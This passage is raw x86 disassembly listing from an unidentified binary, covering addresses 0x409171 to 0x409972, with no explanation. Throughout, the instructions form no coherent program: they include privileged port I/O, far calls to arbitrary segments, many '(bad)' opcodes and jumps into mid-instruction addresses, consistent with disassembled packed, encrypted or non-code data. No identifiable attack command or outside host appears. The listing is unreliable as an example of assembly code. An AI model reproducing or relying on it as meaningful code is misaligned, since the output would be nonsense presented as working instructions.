  409171:	call   FWORD PTR [esi-0x39]
  409174:	call   0x6900:0xb5108b24
  40917b:	xchg   esi,eax
  40917c:	out    0xdc,al
  40917e:	lea    esp,[ebx+0x4caf19f5]
  409184:	outs   dx,DWORD PTR ds:[esi]
  409185:	add    BYTE PTR [ebx],dl
  409187:	lahf   
  409188:	xchg   esp,eax
  409189:	icebp  
  40918a:	pop    edx
  40918b:	or     eax,0x3cfe61d3
  409190:	inc    eax
  409191:	outs   dx,DWORD PTR ds:[esi]
  409192:	int3   
  409193:	sub    eax,0x79752750
  409198:	inc    eax
  409199:	fstp   TBYTE PTR [eax+0x11]
  40919c:	arpl   WORD PTR [eax],sp
  40919e:	cdq    
  40919f:	je     0x4091e7
  4091a1:	call   0x5c:0xb2735580
  4091a8:	xor    eax,0xe5980ca9
  4091ad:	push   esi
  4091ae:	dec    ecx
  4091af:	jmp    DWORD PTR ds:0x8708bfd0
  4091b5:	sub    bl,BYTE PTR [edx-0x7f493a65]
  4091bb:	push   ss
  4091bc:	pop    ecx
  4091bd:	int3   
  4091be:	mov    bh,0xd8
  4091c0:	inc    ecx
  4091c1:	mov    ds,WORD PTR [eax+0x22]
  4091c4:	cmp    eax,DWORD PTR [eax]
  4091c6:	sub    ch,bh
  4091c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091c9:	jp     0x4091f4
  4091cb:	xchg   ebx,eax
  4091cc:	nop
  4091cd:	xchg   ecx,eax
  4091ce:	call   FWORD PTR [esi+0x3c]
  4091d1:	outs   dx,DWORD PTR ds:[esi]
  4091d2:	push   ebx
  4091d3:	arpl   WORD PTR [ebx+0x78],cx
  4091d6:	cmp    cl,BYTE PTR [ebx+0x60]
  4091d9:	jno    0x4091d2
  4091db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091dc:	or     BYTE PTR [esp+esi*1-0x2a8c2f9f],al
  4091e3:	push   esp
  4091e4:	pop    eax
  4091e5:	gs mov bl,0x0
  4091e8:	loope  0x4091b0
  4091ea:	mov    cl,0x5e
  4091ec:	mov    ch,BYTE PTR [ebx+ecx*8-0x789e2977]
  4091f3:	arpl   WORD PTR ds:0x5f74e5f6,bx
  4091f9:	mov    bl,0x56
  4091fb:	xchg   DWORD PTR [esi+0x79761911],ebx
  409201:	or     ch,BYTE PTR fs:[edx-0x559657f9]
  409208:	sbb    dl,BYTE PTR [ecx]
  40920a:	das    
  40920b:	inc    bx
  40920d:	sti    
  40920e:	pop    ss
  40920f:	inc    esp
  409210:	cmp    ch,BYTE PTR [ebp+0x51]
  409213:	pusha  
  409214:	loopne 0x40919c
  409216:	mov    cs,eax
  409218:	fwait
  409219:	push   esp
  40921a:	sbb    dl,ch
  40921c:	jmp    0x409297
  40921e:	xor    DWORD PTR [eax],esi
  409220:	pop    ebp
  409221:	out    0x82,eax
  409223:	inc    esi
  409224:	shl    BYTE PTR [esi+0x20],cl
  409227:	lods   eax,DWORD PTR ds:[esi]
  409228:	mov    ds:0x5e5f949d,al
  40922d:	js     0x40924e
  40922f:	addr16 sbb eax,0xf64bad73
  409235:	bnd je 0x40926d
  409238:	std    
  409239:	ja     0x4091e0
  40923b:	add    al,0x3
  40923d:	idiv   DWORD PTR [ebp-0x2d1a89b3]
  409243:	std    
  409244:	mov    BYTE PTR [eax+0x6f3a0c7f],dh
  40924a:	push   ds
  40924b:	inc    eax
  40924c:	shl    BYTE PTR [si],cl
  40924f:	pop    eax
  409250:	mov    edi,0x19114085
  409255:	inc    edi
  409256:	ret    
  409257:	mov    ds:0x3783899d,eax
  40925c:	push   es
  40925d:	mov    eax,ds:0xbb613517
  409262:	sbb    DWORD PTR [edi+0x2f0adf04],eax
  409268:	jae    0x409209
  40926a:	mov    al,0x37
  40926c:	xor    eax,0x5553810c
  409271:	fsubr  QWORD PTR [eax+ecx*4-0x69]
  409275:	mov    ebp,0xe7817aa2
  40927a:	sub    eax,0x7bc3c239
  40927f:	dec    edx
  409280:	push   esi
  409281:	mov    dh,0x83
  409283:	jo     0x40920d
  409285:	or     edi,DWORD PTR [esi-0x8]
  409288:	retf   0x24f5
  40928b:	stos   BYTE PTR es:[edi],al
  40928c:	and    ebx,ebp
  40928e:	push   ebx
  40928f:	out    0xba,eax
  409291:	cmp    al,0x54
  409293:	or     al,0xc5
  409295:	dec    eax
  409296:	lahf   
  409297:	shld   edi,esi,0x3a
  40929b:	mov    bl,0xc5
  40929d:	xchg   ebp,eax
  40929e:	es or  al,0x26
  4092a1:	daa    
  4092a2:	inc    ecx
  4092a3:	daa    
  4092a4:	mov    ah,0x57
  4092a6:	into   
  4092a7:	or     dl,BYTE PTR [eax]
  4092a9:	fsub   DWORD PTR [ebx]
  4092ab:	mov    bl,0xe2
  4092ad:	sbb    DWORD PTR [eax+0xde94f57],0x7c45c6f7
  4092b7:	pop    es
  4092b8:	xlat   BYTE PTR ds:[ebx]
  4092b9:	shr    BYTE PTR [edx+0x8],cl
  4092bc:	and    al,0xbf
  4092be:	xchg   esi,eax
  4092bf:	mov    edx,0x37136bf2
  4092c4:	pop    ss
  4092c5:	repnz push eax
  4092c7:	sahf   
  4092c8:	sbb    al,0xa7
  4092ca:	xor    DWORD PTR [esp+ebp*8],0x13
  4092ce:	mov    dl,0x68
  4092d0:	inc    edi
  4092d1:	pop    ebp
  4092d2:	mov    al,0xcc
  4092d4:	xchg   esi,eax
  4092d5:	fneni(8087 only) 
  4092d7:	outs   dx,BYTE PTR ds:[esi]
  4092d8:	push   edi
  4092d9:	lahf   
  4092da:	xor    ah,BYTE PTR [ecx-0x109fb184]
  4092e0:	out    0x1,eax
  4092e2:	sahf   
  4092e3:	movups xmm2,XMMWORD PTR [ebx-0xa]
  4092e7:	scas   al,BYTE PTR es:[edi]
  4092e8:	fnstcw WORD PTR ds:[eax+esi*1-0x12dbc36a]
  4092f0:	(bad)  
  4092f1:	retf   0x4244
  4092f4:	fcom   QWORD PTR [edx+0x6cc1fb01]
  4092fa:	inc    ebx
  4092fb:	inc    ecx
  4092fc:	dec    eax
  4092fd:	(bad)  
  4092fe:	xor    eax,0xa356b053
  409303:	sbb    al,ah
  409305:	imul   esp,DWORD PTR [ecx+ebp*4-0x58],0xa5c1c42
  40930d:	ins    DWORD PTR es:[edi],dx
  40930e:	stc    
  40930f:	cmp    al,0xc4
  409311:	fs xor al,0xda
  409314:	push   edx
  409315:	jo     0x4092b0
  409317:	scas   eax,DWORD PTR es:[edi]
  409318:	aaa    
  409319:	ret    0x4dc5
  40931c:	fdivr  DWORD PTR [eax-0x7b]
  40931f:	popf   
  409320:	jns    0x40935c
  409322:	sar    DWORD PTR [eax+0x5ee9a1e],0xb8
  409329:	in     al,dx
  40932a:	lods   eax,DWORD PTR ds:[esi]
  40932b:	push   ebx
  40932d:	dec    esp
  40932e:	mov    WORD PTR [esi+0x4c],ds
  409331:	mov    ds:0x47397089,al
  409336:	dec    eax
  409337:	pop    ecx
  409338:	jmp    0xa03f3709
  40933d:	add    al,0x13
  40933f:	dec    ebx
  409340:	add    eax,0xbd878603
  409345:	fcmovbe st,st(4)
  409347:	mov    ds:0xc3966469,al
  40934c:	push   0x909a6c26
  409351:	jg     0x409337
  409353:	mov    WORD PTR [edx],gs
  409355:	retf   0x88f9
  409358:	out    0xe3,eax
  40935a:	and    bh,ah
  40935c:	cwde   
  40935d:	fcmovnb st,st(1)
  40935f:	or     BYTE PTR [ecx+0x559797c7],cl
  409365:	jmp    0x409349
  409367:	lock loop 0x4093cb
  40936a:	(bad)
  40936f:	lock pop ebp
  409371:	mov    ebp,0x34d934f
  409376:	adc    BYTE PTR [eax+0x2afa97fd],cl
  40937c:	ror    ah,cl
  40937e:	jl     0x409396
  409380:	(bad)  
  409382:	in     eax,dx
  409383:	idiv   BYTE PTR [esi+esi*4-0x631468ff]
  40938a:	(bad)
  40938d:	mov    dh,bl
  40938f:	out    dx,eax
  409390:	pop    es
  409391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409392:	xor    eax,0xbedc901
  409397:	or     al,0x9a
  409399:	sub    DWORD PTR es:[edi+eiz*8-0x2c4e1711],esp
  4093a1:	push   ss
  4093a2:	mov    bl,BYTE PTR [ecx+eax*1+0x599e6cc4]
  4093a9:	fwait
  4093aa:	rcr    DWORD PTR [ecx-0x6],0xd1
  4093ae:	dec    ebp
  4093af:	push   0x68
  4093b1:	in     eax,0x3a
  4093b3:	mov    ds:0xd72050a7,eax
  4093b8:	adc    cl,dl
  4093ba:	loopne 0x409380
  4093bc:	push   ebx
  4093bd:	imul   eax,DWORD PTR [edi+0x4efca5da],0x6
  4093c4:	fadd   DWORD PTR [esi+0x7fe45e99]
  4093ca:	xor    al,0x7d
  4093cc:	call   0x6d86:0x3514374b
  4093d3:	int3   
  4093d4:	imul   ecx,DWORD PTR [edx+0x6e],0x5cf027bc
  4093db:	retf   
  4093dc:	sub    eax,0x6fcf045
  4093e1:	clc    
  4093e2:	push   esp
  4093e3:	cs add al,0x92
  4093e6:	test   BYTE PTR [eax],0x88
  4093e9:	sti    
  4093ea:	pop    edi
  4093eb:	jo     0x4093ce
  4093ed:	cli    
  4093ee:	push   ds
  4093ef:	sbb    BYTE PTR [eax-0x4d],ch
  4093f2:	dec    edi
  4093f3:	loopne 0x409389
  4093f5:	and    eax,0xdcc4ec5c
  4093fa:	ret    0xf13a
  4093fd:	out    dx,eax
  4093fe:	jg     0x40940c
  409400:	mov    cl,0xf
  409402:	adc    al,BYTE PTR [ecx-0x2efc0b37]
  409408:	lea    esp,[esi+0x71]
  40940b:	add    DWORD PTR [edi+0x46],ecx
  40940e:	mov    ebp,0xeb6dced0
  409413:	lock outs dx,BYTE PTR ds:[esi]
  409415:	cmc    
  409416:	inc    esi
  409417:	push   ss
  409418:	jl     0x409426
  40941a:	cwde   
  40941b:	div    BYTE PTR [eax-0x6]
  40941e:	sbb    eax,0xacbcf446
  409423:	dec    edi
  409424:	js     0x409430
  409426:	test   BYTE PTR [edi+0x42986cbc],bh
  40942c:	adc    eax,0x7043e76a
  409431:	ror    BYTE PTR [eax+ebx*2-0x1474d88f],0xb0
  409439:	lods   eax,DWORD PTR ds:[esi]
  40943a:	je     0x40941b
  40943c:	bound  edi,QWORD PTR [esi]
  40943e:	xchg   ebp,eax
  40943f:	or     eax,0xac72b520
  409444:	test   eax,0xfc67c21c
  409449:	dec    ebx
  40944a:	and    eax,0xc03ca665
  40944f:	sub    DWORD PTR [edx-0xb],ebp
  409452:	in     eax,dx
  409453:	icebp  
  409454:	push   eax
  409455:	data16 lods al,BYTE PTR ds:[esi]
  409457:	or     eax,0x3ba65761
  40945c:	add    dh,ah
  40945e:	pusha  
  40945f:	outs   dx,BYTE PTR ds:[esi]
  409460:	cld    
  409461:	and    eax,0x9bea7822
  409466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409467:	jmp    0x19fc0f35
  40946c:	mov    ?,WORD PTR [edi-0x662eaae7]
  409472:	sbb    bh,ah
  409474:	push   ds
  409475:	mov    esi,DWORD PTR [ebx+0xf]
  409478:	je     0x409425
  40947a:	inc    ebp
  40947b:	adc    DWORD PTR es:[edx],esi
  40947e:	lea    edi,[esi+0x1e]
  409481:	or     ebx,DWORD PTR [ebx]
  409483:	fnstsw WORD PTR [ecx-0x56]
  409486:	mov    al,ch
  409488:	cld    
  409489:	mov    gs,WORD PTR [edi+ebp*8-0x3a]
  40948d:	aam    0x10
  40948f:	popf   
  409490:	xchg   edx,eax
  409491:	clc    
  409492:	mov    dl,0x53
  409494:	xor    esp,DWORD PTR [ecx]
  409496:	cmp    ah,BYTE PTR [eax]
  409498:	test   BYTE PTR [eax-0x15af5347],dl
  40949e:	dec    eax
  40949f:	das    
  4094a0:	sub    dl,BYTE PTR [esi-0x52bf3a7d]
  4094a6:	cmp    edi,DWORD PTR es:[ebx+edi*8]
  4094aa:	jp     0x409465
  4094ac:	and    al,0x89
  4094ae:	xchg   ebp,eax
  4094af:	shl    esp,0x37
  4094b2:	xor    edi,DWORD PTR [ecx-0x391c6c56]
  4094b8:	xchg   edi,eax
  4094b9:	jle    0x4094c1
  4094bb:	jmp    0x409474
  4094bd:	xchg   edi,eax
  4094be:	bnd jb 0x409494
  4094c1:	dec    ebx
  4094c2:	mov    DWORD PTR [esp+edx*8],ebp
  4094c5:	daa    
  4094c6:	icebp  
  4094c7:	and    esi,DWORD PTR [ecx+0x7ce80dad]
  4094cd:	das    
  4094ce:	push   esi
  4094cf:	fwait
  4094d0:	test   BYTE PTR [ecx+0x63],cl
  4094d3:	jmp    0xc5ea:0xbfe17b0d
  4094da:	add    DWORD PTR [eax],esi
  4094dc:	push   ss
  4094dd:	pop    edi
  4094de:	lds    ecx,FWORD PTR [ebx+0x7a]
  4094e1:	sub    eax,edx
  4094e3:	xor    esp,DWORD PTR [ebp-0x4452e432]
  4094e9:	dec    eax
  4094ea:	leave  
  4094eb:	fs mov edx,0x7a2226a6
  4094f1:	cmp    al,ch
  4094f3:	popf   
  4094f4:	lods   al,BYTE PTR ds:[esi]
  4094f5:	jg     0x4094e6
  4094f7:	clc    
  4094f8:	xchg   esp,eax
  4094f9:	adc    BYTE PTR [edi],cl
  4094fb:	lahf   
  4094fc:	and    al,0xfa
  4094fe:	sbb    al,cl
  409500:	adc    eax,0xc312b3a7
  409505:	in     eax,dx
  409506:	retf   0xdb31
  409509:	jae    0x4094a5
  40950b:	imul   eax,DWORD PTR [edi],0x39991625
  409511:	in     eax,dx
  409512:	xchg   edi,eax
  409513:	(bad)  
  409514:	fcmovu st,st(4)
  409516:	xchg   BYTE PTR [edi+0x52d7d2d4],bl
  40951c:	jb     0x409583
  40951e:	dec    ebp
  40951f:	fimul  WORD PTR [edi-0x539a7fd1]
  409525:	not    BYTE PTR [eax]
  409527:	jecxz  0x409533
  409529:	push   0xfffffff9
  40952b:	dec    ebp
  40952c:	ss and dl,BYTE PTR gs:[ebp-0x7cd89ee9]
  409534:	jnp    0x4094c3
  409536:	xchg   ecx,eax
  409537:	sub    al,al
  409539:	push   ebp
  40953a:	mov    bl,0xc3
  40953c:	ror    ebx,1
  40953e:	push   ds
  40953f:	das    
  409540:	pop    edx
  409541:	jmp    0xdc1c7dba
  409546:	xchg   ebx,eax
  409547:	inc    al
  409549:	mov    ah,0x3f
  40954b:	aaa    
  40954c:	rol    BYTE PTR [edx+0x3],cl
  40954f:	je     0x4095ab
  409551:	icebp  
  409552:	pop    ds
  409553:	fimul  DWORD PTR [ecx+0x2ea9b18c]
  409559:	sbb    dh,cl
  40955b:	xchg   ebp,eax
  40955c:	xchg   ebp,eax
  40955d:	popf   
  40955e:	cmp    dl,bh
  409560:	lods   al,BYTE PTR ds:[esi]
  409561:	pop    edx
  409562:	push   ebx
  409563:	xchg   ebx,eax
  409564:	xor    BYTE PTR [ebx+0x135fa6e7],ah
  40956a:	fwait
  40956b:	cld    
  40956c:	(bad)  
  40956d:	(bad)  
  40956e:	add    DWORD PTR ds:[eax],ebp
  409571:	mov    esp,0xb6758565
  409576:	adc    BYTE PTR [ecx+0x3d9cbe8b],al
  40957c:	xchg   edx,eax
  40957d:	sub    eax,0x8dc93a40
  409582:	stos   DWORD PTR es:[edi],eax
  409583:	adc    al,0xe8
  409585:	jl     0x409559
  409587:	inc    esp
  409588:	mov    esi,0xf86c7bbd
  40958d:	and    al,0xc8
  40958f:	bound  eax,QWORD PTR [ecx+0x44c499ba]
  409595:	es nop
  409597:	stos   DWORD PTR es:[edi],eax
  409598:	adc    esp,DWORD PTR [edx]
  40959a:	xor    eax,0xa504abd
  40959f:	xor    al,0xe4
  4095a1:	mov    ah,BYTE PTR [ebp+0x2e9351b]
  4095a7:	pusha  
  4095a8:	stos   BYTE PTR es:[edi],al
  4095a9:	cmp    esi,ebx
  4095ab:	pop    edx
  4095ac:	xchg   ebx,eax
  4095ad:	add    BYTE PTR ds:0x34059021,bl
  4095b3:	sbb    al,0x14
  4095b5:	adc    cl,ah
  4095b7:	rcr    DWORD PTR [ebp+ebx*4-0x22c98e29],cl
  4095be:	mov    bh,0x39
  4095c0:	mov    BYTE PTR [ebx],ch
  4095c2:	data16 cmp al,0x13
  4095c5:	push   esp
  4095c6:	out    0xd7,eax
  4095c8:	inc    ebp
  4095c9:	ins    DWORD PTR es:[edi],dx
  4095ca:	rcr    edi,0x15
  4095cd:	mov    ds:0x52251776,al
  4095d2:	imul   edi,ebp,0x30
  4095d5:	adc    BYTE PTR [ecx+0x7ffc69e8],al
  4095db:	out    dx,al
  4095dc:	xchg   BYTE PTR [eax],bl
  4095de:	pop    ss
  4095df:	or     al,0x7d
  4095e1:	ins    DWORD PTR es:[edi],dx
  4095e2:	mov    ch,0x60
  4095e4:	push   edi
  4095e5:	dec    esi
  4095e6:	dec    esi
  4095e7:	jae    0x4095be
  4095e9:	dec    edx
  4095ea:	enter  0xedbb,0x50
  4095ee:	mov    fs,WORD PTR [ecx]
  4095f0:	mov    ecx,0x9b9603f6
  4095f5:	mov    BYTE PTR [esi],bl
  4095f7:	outs   dx,DWORD PTR ds:[esi]
  4095f8:	add    eax,0xae6276e0
  4095fd:	stc    
  4095fe:	jmp    0xbb2:0xe40d8081
  409605:	sbb    al,0xb
  409607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409608:	(bad)  
  409609:	mov    ecx,0x106157cf
  40960e:	int    0xaa
  409610:	xchg   esp,eax
  409611:	hlt    
  409612:	push   esp
  409613:	jge    0x4095a5
  409615:	addr16 dec ax
  409618:	pop    ecx
  409619:	loop   0x4095c5
  40961b:	sub    DWORD PTR [ebx-0x138e1744],eax
  409621:	sub    al,0x12
  409623:	add    al,0x13
  409625:	mov    al,ds:0xa455e42c
  40962a:	xor    ebx,esp
  40962c:	popa   
  40962d:	sbb    DWORD PTR [ebx+0x6942a831],ebp
  409633:	sti    
  409634:	jle    0x409644
  409636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409637:	inc    esp
  409638:	gs inc esp
  40963a:	into   
  40963b:	jl     0x40965a
  40963d:	out    dx,al
  40963e:	jmp    0x4095c0
  409640:	dec    esp
  409641:	push   eax
  409642:	jmp    0x5b955d2
  409647:	xchg   edi,eax
  409648:	(bad)  
  409649:	mov    al,ds:0xbbac9a3
  40964e:	lea    eax,[ebp+0x7204d0e3]
  409654:	dec    eax
  409655:	add    BYTE PTR [esi+ebp*4+0x4d],al
  409659:	daa    
  40965a:	cs pop ecx
  40965c:	clc    
  40965d:	inc    ebx
  40965e:	or     DWORD PTR [eax+0x7caaa03d],0xaf09052f
  409668:	push   edx
  409669:	aas    
  40966a:	and    esi,DWORD PTR [ebx+0x4b]
  40966d:	or     ebp,DWORD PTR [edi+0xaa916b8]
  409673:	xchg   edx,eax
  409674:	test   DWORD PTR [eax+0x4d],ebp
  409677:	add    al,0x38
  409679:	loope  0x409627
  40967b:	xchg   ecx,eax
  40967c:	mov    ah,0x96
  40967e:	lock inc ebx
  409680:	dec    ebp
  409681:	idiv   BYTE PTR [eax]
  409683:	cmp    eax,DWORD PTR [esi]
  409685:	pop    esp
  409686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409687:	lods   al,BYTE PTR ds:[esi]
  409688:	neg    DWORD PTR [eax-0x608a98f8]
  40968e:	ror    DWORD PTR [ebp+ebp*2+0xc],0x39
  409693:	test   DWORD PTR [edi+0x520d6af8],esp
  409699:	mov    al,ds:0x47ae9c8d
  40969e:	pop    ds
  40969f:	mov    al,0x5
  4096a1:	fnstcw WORD PTR [ebx]
  4096a3:	pop    edx
  4096a4:	lahf   
  4096a5:	popa   
  4096a6:	sbb    al,0xab
  4096a8:	mov    cl,0x4d
  4096aa:	jmp    0x40966e
  4096ac:	xchg   ecx,eax
  4096ad:	int    0x88
  4096af:	sbb    edx,ebx
  4096b1:	xchg   edx,eax
  4096b2:	call   0xec6b0dfc
  4096b7:	mov    dl,0x8d
  4096b9:	and    ebx,edi
  4096bb:	cmc    
  4096bc:	mov    ebx,0xebd14bad
  4096c1:	int    0xf3
  4096c3:	push   ecx
  4096c4:	xchg   ebp,eax
  4096c5:	ret    
  4096c6:	push   0xc
  4096c8:	push   esp
  4096c9:	imul   ecx,DWORD PTR [ecx+0x4a6be68e],0x20ae1f94
  4096d3:	inc    edi
  4096d4:	sub    eax,0xab18ece9
  4096d9:	pushf  
  4096da:	inc    ecx
  4096db:	iret   
  4096dc:	jno    0x409668
  4096de:	pop    esi
  4096df:	in     eax,dx
  4096e0:	fcom   st(0)
  4096e2:	sbb    al,0x59
  4096e4:	adc    edi,DWORD PTR cs:[esi-0x57]
  4096e8:	icebp  
  4096e9:	adc    edi,edi
  4096eb:	xchg   edx,eax
  4096ec:	pop    ecx
  4096ed:	test   eax,0xb8fcfde2
  4096f2:	jecxz  0x409685
  4096f4:	je     0x4096f0
  4096f6:	fisubr DWORD PTR [edi+0x488d094e]
  4096fc:	ss push edx
  4096fe:	xor    ah,BYTE PTR [ebx+0x5773890]
  409704:	into   
  409705:	xor    BYTE PTR [eax-0x2da8e002],cl
  40970b:	fcmovu st,st(2)
  40970d:	dec    DWORD PTR [edi-0x67fb2413]
  409713:	xor    eax,0x1cf1375f
  409718:	(bad)  
  409719:	cli    
  40971a:	push   ebx
  40971b:	(bad)  
  40971c:	call   0x241d:0x1d4f1dba
  409723:	ins    DWORD PTR es:[edi],dx
  409724:	ret    
  409725:	aaa    
  409726:	aad    0xcf
  409728:	test   al,0x21
  40972a:	pop    edx
  40972b:	jecxz  0x4096eb
  40972d:	or     eax,0xce276a6f
  409732:	cmp    BYTE PTR [esi+eiz*4-0x388134e9],cl
  409739:	push   0xf1e35f8f
  40973e:	pop    ds
  40973f:	dec    ebx
  409740:	gs sbb bh,ah
  409743:	pop    edi
  409744:	xchg   esp,eax
  409745:	aas    
  409746:	ss pop ds
  409748:	xor    BYTE PTR [ecx],dh
  40974a:	scas   al,BYTE PTR es:[edi]
  40974b:	jg     0x4096f2
  40974d:	inc    ecx
  40974e:	mov    ebp,0x5ccc0840
  409753:	nop
  409754:	pop    ds
  409755:	call   0xe9b89f56
  40975a:	mov    ebx,0x12066ec8
  40975f:	repz push edi
  409761:	nop
  409762:	into   
  409763:	mov    bh,0x55
  409765:	pop    es
  409766:	add    BYTE PTR [ebp+eax*2-0x63f6711e],ah
  40976d:	data16 mov bh,0x3e
  409770:	sbb    eax,0xa419c293
  409775:	bound  eax,QWORD PTR [edx]
  409777:	jne    0x4097b8
  409779:	test   al,0x3a
  40977b:	sub    ebp,ebx
  40977d:	mov    al,ds:0xa41aaba2
  409782:	rcr    DWORD PTR [ecx],0x96
  409785:	lods   eax,DWORD PTR ds:[esi]
  409786:	xchg   esp,eax
  409787:	sub    edi,DWORD PTR [ebx+ecx*1]
  40978a:	cdq    
  40978b:	scas   al,BYTE PTR es:[edi]
  40978c:	leave  
  40978d:	push   esi
  40978e:	in     al,dx
  40978f:	outs   dx,BYTE PTR ds:[esi]
  409790:	pusha  
  409791:	cmp    eax,ecx
  409793:	add    DWORD PTR [ecx],ebp
  409795:	sbb    al,0x45
  409797:	sub    DWORD PTR [edx+0x70],esi
  40979a:	push   esp
  40979b:	mov    esi,0x4c394c41
  4097a0:	jp     0x4097c5
  4097a2:	cli    
  4097a3:	out    dx,al
  4097a4:	xor    ebp,DWORD PTR [ebx]
  4097a6:	ds push ebp
  4097a8:	jmp    0x5407:0x90a6e7e4
  4097af:	stos   DWORD PTR es:[edi],eax
  4097b0:	push   es
  4097b1:	test   eax,0x60e9fb1c
  4097b6:	pop    edx
  4097b7:	mov    BYTE PTR [esi+edi*8-0x3e],ch
  4097bb:	pop    edx
  4097bc:	test   eax,0xb458f7b6
  4097c1:	push   esp
  4097c2:	inc    edx
  4097c3:	lahf   
  4097c4:	pusha  
  4097c5:	cmp    eax,0xcab31763
  4097ca:	push   0x3ae25663
  4097cf:	pop    ecx
  4097d0:	mov    gs,WORD PTR [ebx-0x54821e21]
  4097d6:	dec    ecx
  4097d7:	jnp    0x40981e
  4097d9:	in     eax,0x3c
  4097db:	in     al,dx
  4097dc:	repnz pop ds
  4097de:	sub    ah,BYTE PTR [ecx]
  4097e0:	or     ah,BYTE PTR [edi]
  4097e2:	inc    ebx
  4097e3:	add    eax,0x1d398aa9
  4097e8:	int    0xa7
  4097ea:	xchg   esi,eax
  4097eb:	sub    eax,0x9733f796
  4097f0:	mov    dh,0xe7
  4097f2:	adc    esp,DWORD PTR [eax-0x7b]
  4097f5:	out    0x76,al
  4097f7:	sbb    edx,DWORD PTR [ebp+0x41]
  4097fa:	(bad)  
  4097fb:	jne    0x4097cd
  4097fd:	hlt    
  4097fe:	pusha  
  4097ff:	sbb    eax,DWORD PTR [ebx+0x4c89a7a5]
  409805:	mul    DWORD PTR [eax+0x7f379e23]
  40980b:	out    0xaa,al
  40980d:	sbb    al,0x46
  40980f:	rol    DWORD PTR [esi],1
  409811:	ret    0x9218
  409814:	int3   
  409815:	popf   
  409816:	jg     0x4097e0
  409818:	dec    ecx
  409819:	mov    ah,BYTE PTR [ecx+0x62]
  40981c:	jb     0x409899
  40981e:	ins    BYTE PTR es:[edi],dx
  40981f:	loope  0x40980b
  409821:	jo     0x40983a
  409823:	pop    ss
  409824:	stos   BYTE PTR es:[edi],al
  409825:	addr16 pusha 
  409827:	adc    al,0xb7
  409829:	out    0x91,al
  40982b:	jnp    0x4097dd
  40982d:	mov    ah,0x97
  40982f:	cmp    bl,BYTE PTR [edi+0x16]
  409832:	imul   BYTE PTR [eax-0x7c2e4bdb]
  409838:	int    0xa2
  40983a:	cdq    
  40983b:	jne    0x40983b
  40983d:	stc    
  40983e:	test   eax,0x3c32dd52
  409843:	mov    esp,0x33b1b7e8
  409848:	inc    esp
  409849:	add    DWORD PTR [ebx+0x454c5051],ebp
  40984f:	jmp    0x21c4:0x68961cf5
  409856:	leave  
  409857:	xor    edx,DWORD PTR [esi-0x1a2f9fbb]
  40985d:	sub    eax,0xf4212bd7
  409862:	in     al,0x16
  409864:	retf   0xfec7
  409867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409868:	push   edx
  409869:	sub    eax,0xf494d52
  40986e:	mov    ds:0x25c77724,eax
  409873:	stc    
  409874:	fwait
  409875:	pop    esi
  409876:	dec    ecx
  409877:	in     eax,dx
  409878:	or     DWORD PTR [ebx+eax*2-0x16a7b625],esi
  40987f:	int3   
  409880:	sub    dh,BYTE PTR [ebx-0x50b0128e]
  409886:	into   
  409887:	jne    0x40980d
  409889:	loope  0x409849
  40988b:	iret   
  40988c:	mov    ds:0xc8831219,al
  409891:	retf   
  409892:	xor    eax,0x641afa06
  409897:	imul   edx,DWORD PTR [ebx+0x27802f97],0x2a
  40989e:	mov    ah,0x59
  4098a0:	adc    BYTE PTR [edi-0x65],al
  4098a3:	sub    dh,BYTE PTR [eax]
  4098a5:	rcl    al,1
  4098a7:	xor    eax,0xa35f7195
  4098ac:	push   ebx
  4098ad:	call   0x91126815
  4098b2:	test   BYTE PTR [ecx-0x680b5eaa],cl
  4098b8:	jmp    0xbbb2b5a9
  4098bd:	push   esp
  4098be:	push   DWORD PTR [edi-0x4e]
  4098c1:	inc    esp
  4098c2:	neg    BYTE PTR [ebp+0x66]
  4098c5:	cmp    BYTE PTR [ecx],bl
  4098c7:	dec    esp
  4098c8:	sub    eax,DWORD PTR [edx+0x6d5a3734]
  4098ce:	adc    eax,0x32e2adce
  4098d3:	ror    DWORD PTR [ebp-0x66],0x8f
  4098d7:	lods   al,BYTE PTR ds:[esi]
  4098d8:	fst    DWORD PTR [edi]
  4098da:	mov    ebx,0xd16f1022
  4098df:	repnz pop ds
  4098e1:	rol    edx,0x64
  4098e4:	dec    ebp
  4098e5:	fstp   st(1)
  4098e7:	aas    
  4098e8:	sub    eax,0xc89b650c
  4098ed:	sbb    BYTE PTR [edi+0x6f],0xa7
  4098f1:	sar    ecx,0xbf
  4098f4:	imul   ebp,DWORD PTR [edx+0x5c],0xfffffff7
  4098f8:	ret    
  4098f9:	jecxz  0x40994e
  4098fb:	add    DWORD PTR [eax-0x6ab3358a],esi
  409901:	xor    al,0x21
  409903:	popaw  
  409905:	std    
  409906:	xchg   DWORD PTR [esi+ebx*8+0x10617a72],esi
  40990d:	xchg   esp,eax
  40990e:	mov    esp,0xe6afed86
  409913:	sti    
  409914:	xchg   edx,eax
  409915:	ins    DWORD PTR es:[edi],dx
  409916:	push   eax
  409917:	xchg   edx,eax
  409918:	lods   al,BYTE PTR ds:[esi]
  409919:	mov    bl,0x5
  40991b:	push   edi
  40991c:	imul   edi,DWORD PTR [ebx+0x2371a7ce],0x6d
  409923:	in     al,0x64
  409925:	nop
  409926:	std    
  409927:	or     DWORD PTR [ebp-0x3b0b68d2],esp
  40992d:	adc    BYTE PTR ss:[ecx-0x80],al
  409931:	jmp    0x3694:0x501b99c1
  409938:	inc    esp
  409939:	ret    0xb338
  40993c:	cmc    
  40993d:	xor    eax,0x8adfb638
  409942:	cs jnp 0x4098d1
  409945:	sahf   
  409946:	add    ch,BYTE PTR [edx+ebx*1+0x344d5f06]
  40994d:	add    al,0xf6
  40994f:	pop    edx
  409950:	mov    edx,0xf554cf2d
  409955:	test   BYTE PTR [ecx-0x55],ah
  409958:	sbb    al,0x1d
  40995a:	dec    edi
  40995b:	jmp    0x2df7d4fa
  409960:	push   esi
  409961:	dec    ebp
  409962:	jp     0x40999c
  409964:	(bad)  
  409965:	xchg   esi,eax
  409966:	stos   BYTE PTR es:[edi],al
  409967:	xchg   ebx,eax
  409968:	xor    al,0x6c
  40996a:	jge    0x4099bd
  40996c:	hlt    
  40996d:	pushw  cs
  40996f:	data16 fsubr QWORD PTR [ecx]
  409972:	mov    edi,0xbe40f6fb
